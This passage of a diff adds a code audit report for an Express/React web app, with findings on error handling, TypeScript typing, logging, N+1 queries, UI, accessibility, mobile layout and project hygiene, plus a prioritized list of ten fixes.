+  const status = err.status || err.statusCode || 500;
+  const message = err.message || "Internal Server Error";
+  res.status(status).json({ message });
+  throw err; // ← PROBLEM
+});
+
+After sending the response, the error is re-thrown. This generates an unhandled exception in the async IIFE at server startup. In Node.js, re-throwing from an Express error handler after the response is sent causes "Can't set headers after they are sent" errors or crashes the request context. The globalErrorHandler in errorHandler.middleware.ts is never registered either — it exists but isn't used by the main server.
+Fix: Remove throw err from the inline error handler. Alternatively, replace the inline handler with the already-written globalErrorHandler from errorHandler.middleware.ts.
+5.3 Pervasive any Types in Server Middleware
+Location: server/middleware/auth.middleware.ts:17,51, server/routes/superadmin.routes.ts, server/routes/organization.routes.ts, and ~15 other route files
+Severity: Medium
+Description: The middleware and route handlers use any extensively: (req: any, res: any, next: any) in auth middleware, (req.user as any).userId throughout routes, (req as any).currentUser pattern. TypeScript strict mode is enabled but these casts disable all type checking for the most critical security-related code (authentication checks).
+Fix: Extend the Express Request type in a global declaration file to include user with a typed interface. Create server/types/express.d.ts:
+declare namespace Express {
+  interface User {
+    userId: string;
+    username?: string;
+    isLocal?: boolean;
+    provider?: string;
+  }
+}
+
+5.4 Extensive console.log/console.error in Production Code
+Location: 327 occurrences across 36 server files
+Severity: Medium
+Description: The codebase uses raw console.log and console.error for all logging, including production webhook events ([Webhook] Payment succeeded: ${id}, User: ${userId}). There is a server/utils/logger.ts file but it is not used by route handlers. Production logs should be structured (JSON) for log aggregation, include log levels, and never include PII in log messages. The payment webhook logs user IDs alongside payment amounts.
+Fix: Replace all console.log/console.error in server code with the existing logger utility from server/utils/logger.ts. Audit webhook and payment logs to ensure no PII (email, name, card details) is ever logged, only IDs.
+5.5 N+1 Database Queries in Admin/Superadmin Endpoints
+Location: server/routes/superadmin.routes.ts:60–70 (metrics endpoint), server/routes/superadmin.routes.ts:148–156 (organizations endpoint)
+Severity: Medium
+Description: The /api/superadmin/metrics endpoint runs for (const org of organizations) and calls storage.getOrganizationMembersByOrganizationId(org.id) for every organization — a classic N+1 query pattern. With 50 organizations, this is 50+ sequential database queries. The comments in storage.ts:1163 note that some queries were optimized, but these loops remain.
+Fix: Refactor to use a single JOIN query that returns organization stats with member counts in one round-trip. Drizzle ORM supports aggregations:
+db.select({ orgId: orgs.id, memberCount: count(members.id) })
+  .from(orgs).leftJoin(members, eq(orgs.id, members.orgId))
+  .groupBy(orgs.id)
+
+6. UI/UX & Design Consistency
+6.1 No React Error Boundary
+Location: client/src/App.tsx and client/src/main.tsx
+Severity: High
+Description: There is no ErrorBoundary component wrapping the application or individual pages. Any uncaught render-time JavaScript error (null access, malformed API response, failed assertion) will crash the entire React tree, showing users a blank white page with no feedback.
+Fix: Create an ErrorBoundary class component and wrap the <Router /> component in App.tsx:
+<ErrorBoundary fallback={<ErrorPage />}>
+  <Router />
+</ErrorBoundary>
+
+Consider also adding per-page boundaries so that one broken page doesn't crash the header/navigation.
+6.2 Font Variables Misconfiguration
+Location: client/src/index.css:52–54
+Severity: Low
+Description: Both --font-sans and --font-serif are set to Poppins, sans-serif. There is no distinct serif font configured. Any Tailwind class using font-serif (e.g., prose elements from @tailwindcss/typography) will render in Poppins rather than a true serif font. This may be intentional, but it means the serif slot of the design system is unused.
+Fix: If no serif font is needed, remove the font-serif CSS variable and the corresponding Tailwind config entry. If serif is needed in the future (e.g., for long-form text in career descriptions), configure Lora or Libre Baskerville (already loaded in the Google Fonts request) as --font-serif.
+6.3 Emoji in Production UI Code
+Location: client/src/pages/Landing.tsx:297 (👩‍🎓), server/index.ts:175 (✓, ❌), server/utils/env-validation.ts:30,37
+Severity: Low
+Description: Emoji characters are used directly in JSX (👩‍🎓) for the testimonial section and in server console output. UI emoji without aria-label or role="img" are read aloud literally by screen readers ("Woman student emoji"). Server-side emoji in console logs is a cosmetic choice.
+Fix: For the UI emoji: <span role="img" aria-label="Graduate student">👩‍🎓</span>. Consider replacing with an SVG icon for full control.
+7. Mobile & Responsiveness
+7.1 Viewport Meta Blocks Zoom (Critical Accessibility/Mobile Issue)
+See Section 2.1 above — this is both an accessibility and mobile issue.
+
+7.2 Header Overflow on Small Screens
+Location: client/src/components/layout/Header.tsx:25–103
+Severity: Medium
+Description: The header navigation renders all buttons in a single <div className="flex gap-2">. For superadmin users, this renders 4 buttons ("Super Admin", "Admin", "Quiz", "Analytics") plus "Profile" and "Logout" — 6 buttons in a horizontal row. On mobile screens (320–375px width), these buttons will overflow or wrap awkwardly. There is no mobile hamburger menu or responsive condensed navigation.
+Fix: Add responsive behavior to the header: hide button text and show only icons on mobile (<span className="hidden sm:inline">Super Admin</span>), or implement a mobile drawer/hamburger menu using the existing Sheet shadcn/ui component for screens below sm breakpoint.
+7.3 Touch Target Size for Navigation Buttons
+Location: client/src/components/layout/Header.tsx
+Severity: Medium
+Description: Navigation buttons use size="sm" variant, which by Radix/shadcn convention renders at h-8 (32px height) — below the WCAG 2.5.5 recommended minimum of 44×44px touch target. On mobile, this makes the header buttons difficult to tap accurately.
+Fix: On mobile viewports, ensure all interactive elements meet the 44×44px minimum. For the header, switch from size="sm" to size="default" on mobile, or add padding utility classes: min-h-[44px] min-w-[44px].
+8. Best Practices & Standards
+8.1 No ESLint Configuration
+Location: Root of project (no .eslintrc*, eslint.config.* found)
+Severity: High
+Description: There is no ESLint configuration file in the project. With TypeScript strict mode enabled but no linting rules, issues like unused imports, implicit any, missing dependency arrays in useEffect, and accessibility violations (jsx-a11y) go undetected. The entire 181-file codebase has no static analysis beyond TypeScript's type checker.
+Fix: Create eslint.config.js with at minimum: @typescript-eslint/recommended, eslint-plugin-react-hooks (detects stale closures and missing deps), and eslint-plugin-jsx-a11y (detects accessibility issues). Run npx eslint . --ext .ts,.tsx as part of npm run check.
+8.2 No .env.example File
+Location: Project root (.env* glob returns no files)
+Severity: High
+Description: There is no .env.example or .env.template file documenting the required and optional environment variables. A new developer setting up the project must read through multiple source files (server/config/constants.ts, server/auth.ts, various service files) to discover all needed variables. The DB_ENCRYPTION_KEY requirement (64 hex chars) and STRIPE_WEBHOOK_SECRET are not obvious.
+Fix: Create .env.example listing all 10 environment variables with descriptions and format requirements. Commit it to the repository. The .gitignore correctly excludes .env but .env.example should be included.
+8.3 Package Name Not Updated from Boilerplate
+Location: package.json:2
+Severity: Low
+Description: The package name is "rest-express" — clearly a boilerplate default. While this doesn't affect functionality, it can cause confusion in npm audit reports and server process names.
+Fix: Change "name": "rest-express" to "name": "future-pathways" in package.json.
+8.4 Production Logging Uses morgan('combined') Without Structured Format
+Location: server/index.ts:91–93
+Severity: Low
+Description: Production uses Apache Combined Log Format, which is human-readable but not machine-parseable. On a platform like Replit Autoscale, structured JSON logs are preferred for log aggregation and alerting.
+Fix: Switch to JSON logging in production: morgan('combined', { stream: { write: (msg) => logger.info(msg) } }) using the existing logger utility.
+8.5 No README.md for the Repository
+Location: Project root
+Severity: Low
+Description: There is no README.md. The replit.md file exists and is comprehensive but is Replit-specific. A README.md with setup instructions, environment variable documentation, development workflow, and deployment steps is a standard expectation for any repository.
+Fix: Create a README.md with project overview, prerequisites, local setup steps, environment variables (pointing to .env.example), and deployment notes.
+8.6 Stripe API Version Uses Future Date
+Location: server/routes/payment.routes.ts:11, server/routes/webhook.routes.ts:9
+Severity: Low
+Description: The Stripe API version is set to "2025-10-29.clover" — a version string from the future (review date is April 2026, but this was likely set in late 2025). Stripe beta/preview API versions with non-standard suffixes like .clover should be validated — ensure this is a legitimate Stripe API version and not a typo.
+Fix: Verify this is the correct production Stripe API version. If using a beta API, evaluate whether a stable version is appropriate. Pin to a version explicitly supported in the stripe npm package version (^19.3.0).
+Prioritized Action Plan — Top 10 Most Impactful Fixes
+Priority	Issue	Severity	Impact
+1	Add meta tags, Open Graph, Twitter Card, <title> to index.html	Critical	SEO is currently zero — no description, no social previews, blank tab title. Fixes SEO#1, SEO#2, A11Y#6 together in one file change.
+2	Fix Google Fonts CSP mismatch (add fonts to CSP or self-host)	Critical	In production, ALL custom fonts are currently blocked by CSP, breaking the entire visual design. Fix Security#1.
+3	Remove maximum-scale=1 from viewport meta	Critical	Violates WCAG 1.4.4. Blocks all users from zooming on mobile. One-character fix in index.html. Fixes A11Y#1 and Mobile#1.
+4	Implement route-level code splitting with React.lazy + Suspense	High	Dramatically reduces initial JS bundle. Every page is currently loaded on first visit. Fixes Perf#2.
+5	Remove 23 unused font families from Google Fonts <link>	High	Single most impactful load-time fix. Removes a massive render-blocking resource. Only Poppins and Inter are used. Fixes Perf#1.
+6	Add React Error Boundary	High	Currently, any render error produces a blank white page. Cheap to add, critical for user experience. Fixes UX#1.
+7	Fix server error handler — remove throw err after res.json()	High	Active server bug causing potential crashes on any unhandled error. Fixes CodeQuality#2.
+8	Change saveUninitialized: false in session config	High	Stops creating database sessions for every bot/crawler visit. Reduces DB load, improves privacy posture. Fixes Security#2.
+9	Add ESLint with react-hooks and jsx-a11y plugins	High	Systematically surfaces the aria-label, useEffect dep, and accessibility gaps across the entire codebase. Enables CI enforcement. Fixes CodeQuality#1 prerequisites.
+10	Create .env.example and robots.txt	High	Two quick file additions. .env.example unblocks new developers; robots.txt prevents admin/auth pages from being indexed. Fixes BestPractices#2 and SEO#2.
+Summary: The application's core functionality, security architecture (CSRF, rate limiting, bcrypt, AES-256-GCM encryption, Stripe webhook verification) and TypeScript type system are all solid. The most critical gaps are in the HTML foundation layer (index.html is bare-bones with no title, no meta description, no SEO tags, and a blocking font request for 25 families), one active production bug (CSP blocks all fonts), and the complete absence of tests and ESLint. Addressing the top 10 items above would substantially lift the site's discoverability, performance on first load, mobile usability, and operational reliability.
